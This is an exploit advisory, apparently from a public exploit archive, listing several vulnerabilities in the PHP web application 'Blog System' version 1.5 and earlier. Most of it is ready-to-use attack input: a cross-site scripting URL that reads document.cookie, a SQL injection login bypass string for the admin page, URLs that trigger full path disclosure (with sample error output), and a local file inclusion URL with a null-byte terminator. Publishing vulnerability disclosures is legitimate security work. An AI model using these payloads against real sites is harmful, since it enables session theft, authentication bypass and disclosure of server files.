Blog System <= 1.5 Multiple Vulnerabilities
===========================================

# Exploit Title: Blog System <= 1.5 Multiple Vulnerabilities
# Date: 04/04/10
# Author: cp77fk4r | empty0page[SHIFT+2]gmail.com<http://gmail.com> | www.DigitalWhisper.co.il<http://www.DigitalWhisper.co.il>
# Software Link: http://www.netartmedia.net/blogsystem/ | http://www.netartmedia.net/blogsystem/demo.html
# Version: <= 1.5
# Tested on: PHP
#
##[Cross Site Scripting]*
http://[SERVER]/ADMIN/index.php?category=(home|comments|lists|habillage|info)&action=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
#
#
##[SQL Injection]
#
http://[SERVER]/index.php
#
i.e.:
#
User: admin
Pass: ' or ''='
#
#
##[FULL PATH DICSLOSURE]**
(Full Path Disclosure (FPD) vulnerabilities enable the attacker to see the path to the webroot/file. e.g.: /home/omg/htdocs/file/. Certain vulnerabilities, such as using the load_file() (within a SQL Injection) query to view the page source, require the attacker to have the full path to the file they wish to view. (OWASP))
#
The following pages require files without checking if they exist. loading them will return a Fatal Errors and Warnings ("No such file or directory") with includes their Full-Path:
#
http://[SERVER]/ADMIN/index.php?category=(home|comments|lists|habillage|info)&action=cP
#
Will returne:
#
Warning: include(home/cP.php) [function.include]: failed to open stream: No such file or directory in [FPD] on line 332
Warning: include(home/cP.php) [function.include]: failed to open stream: No such file or directory in [FPD] on line 332
Warning: include() [function.include]: Failed opening 'home/pa.php' for inclusion (include_path='.:/usr/lib/php:/usr/local/lib/php') in [FPD] on line 332
#
#
http://[SERVER]/blog.php?user=admin&month2=4&year2=aaaaaaaaaaaaa
#
Will Returne:
#
Warning: mktime() expects parameter 6 to be long, string given in [FPD] on line 179
Warning: mktime() expects parameter 6 to be long, string given in [FPD] on line 180
#
#
##[LOCAL FILE INCLUSION]**
http://[SERVER]/ADMIN/index.php?category=(home|comments|lists|habillage|info)&action=[LFI]%00
#
#
*The victim must be logged in.
**The attacker must be logged in.
#
#
[e0f]



